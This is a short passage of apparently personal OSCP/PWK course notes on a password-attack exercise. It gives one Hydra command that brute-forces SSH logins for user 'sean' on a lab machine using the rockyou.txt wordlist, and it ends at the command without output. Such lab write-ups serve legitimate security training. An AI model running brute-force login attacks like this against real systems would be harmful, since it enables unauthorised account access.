19.3.3.1

# 19.3.3.1 
## 19.3.3.1.1. Recreate the Hydra SSH attack against your Kali VM.

Didn't do this on my own Kali. Instead, did it on a PWK lab machine 'sean' since I already know it had an SSH login using rockyou.txt

```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/19_passwordAttacks$ hydra -l sean -P /usr/share/wordlists/rockyou.txt ssh://10.11.1.251
